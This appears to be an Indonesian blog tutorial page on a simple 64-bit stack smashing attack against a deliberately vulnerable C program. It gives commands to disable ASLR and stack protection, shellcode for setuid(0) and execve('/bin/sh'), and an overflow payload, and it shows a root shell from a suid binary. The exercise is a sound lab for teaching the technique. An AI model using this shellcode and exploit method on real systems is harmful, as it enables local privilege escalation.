@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+
+<!-- Begin Jekyll SEO tag v2.6.0 -->
+<title>Stack Smashing Sederhana | DXH30</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Stack Smashing Sederhana" />
+<meta name="author" content="Didik" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c" />
+<meta property="og:description" content="Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c" />
+<link rel="canonical" href="http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html" />
+<meta property="og:url" content="http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html" />
+<meta property="og:site_name" content="DXH30" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-12T00:00:00+08:00" />
+<script type="application/ld+json">
+{"description":"Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c","datePublished":"2019-04-12T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Didik"},"url":"http://localhost:4000/jekyll/update/2019/04/12/stack-smashing-sederhana.html","headline":"Stack Smashing Sederhana","dateModified":"2019-04-12T00:00:00+08:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>DXH30</h1>
+        <h2>DXH30 website for Programming and CTF's Write Ups. and History for github Projects</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>12 April 2019</small>
+<h1>Stack Smashing Sederhana</h1>
+
+<p class="view">by Didik</p>
+
+<p>Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#define BATASAN 500
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Berikut ini adalah programnya</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+	<span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+	<span class="n">c</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">BATASAN</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Terbaca %d, isinya : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 520 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> gcc <span class="nt">-g</span> <span class="nt">-fno-stack-protector</span> oke.c <span class="nt">-o</span> oke
+<span class="gp">user@localhost:~$</span> <span class="nb">sudo </span>su
+<span class="go">[sudo] password for	user:
+</span><span class="gp">user@localhost:~#</span> <span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/randomize_va_space
+<span class="gp">user@localhost:~#</span> <span class="nb">exit</span>
+<span class="gp">user@localhost:~$</span>
+</code></pre></div></div>
+
+<p>Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 420 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> gcc <span class="nt">-g</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack oke.c <span class="nt">-o</span> oke
+<span class="gp">user@localhost:~$</span> <span class="nb">sudo </span>su
+<span class="go">[sudo] password for	user:
+</span><span class="gp">user@localhost:~#</span> <span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/randomize_va_space
+<span class="gp">user@localhost:~#</span> <span class="nb">exit</span>
+<span class="gp">user@localhost:~$</span>
+</code></pre></div></div>
+
+<p>Untuk memastikan stack protector mati. Coba jalankan programnya dan masukkan inputan A 80, 100, 200, sampai 300 kali, dan terus tambah sampai core dumped. Abaikan karakter aneh di paling kanan. Ini juga merupakan cara untuk mengetahui byte offset sebelum Terjadi segmentation fault. Dalam case ini saya dapati byte offsetnya ada di byte ke 104, karena pada byte 105 dia Segmentation Fault (Dengan cara coba-coba :D).</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> ./oke
+<span class="go">Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 80, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class="gp">user@localhost:~$</span> ./oke
+<span class="go">Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 100, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
+</span><span class="gp">user@localhost:~$</span> ./oke
+<span class="go">Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+</span></code></pre></div></div>
+
+<p>Kalau mau gampang menggunakan perl inline dan outputnya di copas saat input data pada program oke</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> perl <span class="nt">-e</span> <span class="s1">'{print("A"x105);}'</span>
+<span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class="gp">user@localhost:~$</span> ./oke
+<span class="go">Berikut ini adalah programnya
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+</span></code></pre></div></div>
+
+<p>Atau cara yang lebih cepat, dengan cara memetakan keluaran dari perintah perl sebagai STDIN untuk perintah ./oke dengan menggunakan piping perintah</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> perl <span class="nt">-e</span> <span class="s1">'{print("A"x105);}'</span> | ./oke
+<span class="go">Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
+Segmentation fault (core dumped)
+</span></code></pre></div></div>
+
+<p>Setelah kita mengetahui byte offsetnya kita bisa pakai untuk buat struktur exploitnya. Pertama-tama kita cari cara untuk menjalankan execve(“/bin/sh”);
+Dapat diperoleh <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">disini</a>, dibagian code[].</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Cara menggunakan shellcode diatas adalah dengan cara menambahkannya pada environment variable. Kemudian alamat dari envar pada ./oke akan di cari dengan menggunakan getenvaddr</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> git clone https://github.com/historypeats/getenvaddr
+<span class="go">Cloning into 'getenvaddr'...
+remote: Enumerating objects: 18, done.
+remote: Counting objects: 100% (18/18), done.
+remote: Compressing objects: 100% (13/13), done.
+remote: Total 18 (delta 4), reused 18 (delta 4), pack-reused 0
+Unpacking objects: 100% (18/18), done.
+</span><span class="gp">user@localhost:~$</span> gcc ./getenvaddr/getenvaddr.c <span class="nt">-o</span> gea
+<span class="gp">user@localhost:~$</span> <span class="nb">export export </span><span class="nv">PWN</span><span class="o">=</span><span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'{printf("\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05");}'</span><span class="sb">`</span>
+<span class="go">
+</span><span class="gp">user@localhost:~$</span> ./gea PWN ./oke
+<span class="go">PWN will be at 0x7fffffffe4a7
+</span></code></pre></div></div>
+
+<p>Kita buat file untuk input, dari ./oke, dan kita tahan dengan menggunakan cat</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> perl <span class="nt">-e</span> <span class="s1">'{print("A"x104,"\xa7\xe4\xff\xff\xff\x7f");}'</span> <span class="o">&gt;</span> <span class="k">in</span>.txt
+<span class="gp">user@localhost;</span>~<span class="nv">$ </span><span class="o">(</span><span class="nb">cat </span><span class="k">in</span>.txt <span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./oke
+<span class="go">Berikut ini adalah programnya
+Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn
+id
+uid=1000(user) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
+</span></code></pre></div></div>
+
+<p>Lalu kita ubah agar program berjalan dengan suid root.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> <span class="nb">sudo chown </span>root:root ./oke
+<span class="gp">user@localhost:~$</span> <span class="nb">sudo chmod </span>4755 ./oke
+</code></pre></div></div>
+
+<p>Kita coba lagi</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@localhost:~$</span> <span class="o">(</span><span class="nb">cat </span><span class="k">in</span>.txt <span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./oke
+<span class="go">Berikut ini adalah programnya
+Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
+id
+uid=0(root) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
+^C
+</span><span class="gp">user@localhost:~$</span> 
+</code></pre></div></div>
+
+<h1 id="sumber">Sumber</h1>
+<p>Untuk shellcodenya dapat diperoleh <a href="http://shell-storm.org/shellcode/files/shellcode-77.php">disini</a>
+Untuk getenvaddr dapat diperoleh <a href="https://github.com/historypeats/getenvaddr">disini</a>
+Sumber bahasa inggris (lebih pro) <a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/">disini</a></p>
+
+<h1 id="note">Note</h1>
+<p>Untuk tutorial bahasa inggris shellcodenya pada distro tertentu tidak dapat digunakan, bedanya shellcode disini menggunakan setuid(0) + execve(“/bin/sh”);</p>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+
+  <small>tags: <em></em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
